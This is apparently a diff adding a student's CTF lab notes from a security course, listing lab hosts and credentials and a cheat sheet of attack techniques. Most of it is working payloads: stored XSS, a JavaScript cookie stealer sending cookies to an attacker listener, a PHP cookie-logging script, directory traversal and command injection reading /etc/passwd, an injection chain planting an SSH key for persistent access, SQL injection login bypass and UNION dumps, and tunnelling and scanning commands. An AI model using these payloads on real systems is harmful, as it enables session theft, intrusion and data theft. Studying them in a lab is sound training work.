@@ -1,0 +1,259 @@
+///Day 1\\\
+
+http://security-ctfd-1.server.kinetic:8000 -or- http://10.50.24.116:8000
+username: user303A20008REEGDIOGBD600
+password: e9YErLDvFlUWxX0
+
+Windows:
+Private: 192.168.65.10
+Float: 10.50.31.135
+xfreerdp /v:10.50.31.135 /u:student /size:1920x1000 /clipboard
+
+Linux:
+Private: 192.168.65.20
+Float: 10.50.23.229
+
+Internet-Grey-Host:
+10.50.28.45
+
+ssh escape sequence (shift ~ release c)
+
+/////////////Resources\\\\\\\\\\\\\
+
+shell-storm.org
+https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html
+-or-
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+ubuntu metasploit install --> compluting for geeks
+socks proxy rfc
+wayback machine
+sqlbolt.com
+
+////////Scraping Data Script\\\\\\\\
+
+import lxml.html
+import requests
+
+page = requests.get('http://quotes.toscrape.com')
+tree = lxml.html.fromstring(page.content)
+
+authors = tree.xpath('//small[@class="author"]/text()')
+
+print ('Authors: ',authors)
+
+/////////HTTP reponse codes////////
+10X == Informational
+2XX == Success
+30X == Redirection
+4XX == Client Error
+5XX == Server Error
+
+/////////HTTP fields/////////
+User-Agent
+Referer
+Cookie
+Date
+Server
+Set-Cookie
+
+/////////WGET/////////
+wget -r -l2 -P /tmp ftp://ftpserver/
+wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' http://website
+wget --load-cookies cookies.txt -p http://....com/interesting/article.php
+
+/////////proxychains with firefox/////////
+preferences-->connection settings-->sockshost localhost 9050
+-or-
+addons--> foxyproxy--> (icon in right corner) settings--> add--> (type)socks5--> (proxy ip) localhost --> (port) 9050
+
+/////////CURL/////////
+curl -o stuff.html http://website/stuff.html
+curl 'www..com' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
+
+/////////decode base65 in CLI/////////
+echo asdfDEF== | base64 -d
+
+/////////Stored XSS/////////
+<img src="http://10.50.XX.XX" onerror="window.open(&quot;http://10.50.CC.CC:8000/ram.png&quot;,&quot;xss&quot;,'height=500,width=500');">
+
+/////////js cookie stealer to send to nc listener/////////
+<script>document.location="http://x.x.x.x:8000? username="+document.cookie;</script>
+
+/////////js posted to the stored xss vulnerable site/////////
+<script>document.location="http://10.50.20.170/uploads/cookiestealer.php?username="+document.cookie;</script>
+
+/////////php script on a webserver that will accept and store the stolen cookie. Must create cookiefile.txt first/////////
+<?php
+$cookie = $_GET["username"];
+$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
+fwrite($steal,$cookie . "\n");
+fclose($steal);
+?>
+
+/////// Web Vulnerable to XSS? \\\\\\\\\\ 
+<script>alert('XSS')</script>
+
+
+//////// Directory Traversal \\\\\\\\\
+
+view_image.php?file=../../etc/passwd
+(from url) ..%2f..%2f..%2f	(../../../)
+
+hey ; whoami
+try || -or- &&
+
+///// Command Injection \\\\\
+
+system("ping -c 1 ".$_GET["ip"]);
+; cat /etc/passwd
+
+/// Generating Keys login as that user without username and password \\\
+
+ssh-keygen
+cd .ssh
+cat id_rsa.pub	
+#copy paste output of above to webserver
+localhost ; mkdir /var/www/.ssh
+localhost ; ls -lisa /var/www/.ssh	#verify creation
+localhost ; echo 'paste-key-here' > /var/www/.ssh/authorized_keys
+ssh www-data@x.x.x.x 
+
+///////// ReverseEngineering Notes \\\\\\\\\\\
+
+objdump -d -M intel <filename>	
+md5sum *
+strings <on-file>
+ltrace ./<linux exe>
+strace ./<linux exe>	#more info than you might want
+=============================================================
+///// GDB \\\\\
+
+gdb
+file <filename>
+show disa
+show disassembly-flavor
+disass main -or- loop
+break *main
+run
+ni	#next instruction
+
+/////////// SQL Injection \\\\\\\\\\\\\\\\
+
+insert into members(firstname, lastname, username, password, email, permissions) values('bob', 'jones', 'Hacker', 'qwer@gmail.com', 1);#
+
+) ' " -- #
+
+SELECT id, name, description, (SELECT MAX(price) FROM products WHERE price <= 50 AND categories.id = category) AS maxamount FROM categories
+
+SELECT id, name, description, (SELECT MAX(price) FROM products WHERE price <= 50 ) FROM categories 
+
+use logins; SELECT username,password FROM users
+	1		3	3	    2
+
+#Post method (put this in username and password field)
+admin' OR 1='1
+
+#Get method (put this in the url)
+?username=comrade' OR 1='1&passwd=comrade' OR 1='1
+
+information_schema	#is a default database
+
+#Union Seletion:
+admin' UNION SELECT 1,2,3,4,5 from Information_Schema.Tables;#
+
+#Show all Tables
+admin' UNION SELECT TABLE_NAME,2,3,4,5 from Information_Schema.Tables;#
+
+#Show all Columns
+admin' UNION SELECT COLUMN_NAME,2,3,4,5 from Information_Schema.Columns;#
+
+#Show all datatbases
+admin' UNION SELECT SCHEMA_NAME,2,3,4,5 from Information_Schema.Schemata;#
+
+admin' UNION SELECT table_schema,2,table_name,column_name,5 FROM Information_Schema.Columns;#
+admin' UNION SELECT name,2,3,4,5 from session.user;#
+
+==========================================================================================
+///////////Recon Flags\\\\\\\\\\\\\\\\\\
+
+->internet_grey_host: 10.50.28.45
+->Network scan: 192.168.28.96/27	(97-126) 
+->Network scan:192.168.150.224/27	(224-254)
+#pulls the flags --> grep -Er '[0-9a-zA-Z]{20}' | grep -vE 'fonts|{*}|js|Binary|css'
+
+#Create tunnel to internet_grey_host
+ssh -X 10.50.28.45 -L 7000:localhost:22 -NTf
+#note the 'f' backgrounds the tunnel. 
+	ps -elf | grep ssh	to view tunnel process
+
+#ssh to internet_grey_host && enumerate
+ssh localhost -p 7000
+scp -P 7000 anotherscan.sh localhost:	#scp scan script via tunnel
+
+ip addr-->10.10.28.40/27  (33-62)
+
+ip ne-->10.10.28.34
+	10.10.28.33
+	10.10.28.62
+
+#scrap webserver
+nmap --script=http-enum 192.168.28.111 
+   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+   /sites/: Potentially interesting folder
+
+#Setup firefox to work with proxychains
+Step 1: ensure dynamic port is set and running
+ssh -D 9050 student@10.50.28.45 -NT
+
+Step 2:
+firefox(from ops)--> addons--> foxyproxy--> (icon in right corner) settings--> add--> (type)socks5--> (proxy ip) localhost --> (port) 9050
+
+#tunnel to 192.168.28.120
+-L 7001:192.168.28.120:4242
+
+#scan 192.168.150.224/27
+for i in {224..254} ; do nc -nvzw1 192.168.150.$i 20-1024 2>&1 & done | grep -E 'OK$|succ|open$'
+
+#wget -r targets
+wget -r 192.168.150.230
+
+#Enumerate SMB
+proxychains nmap --script=smb-os-discovery 192.168.150.245
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
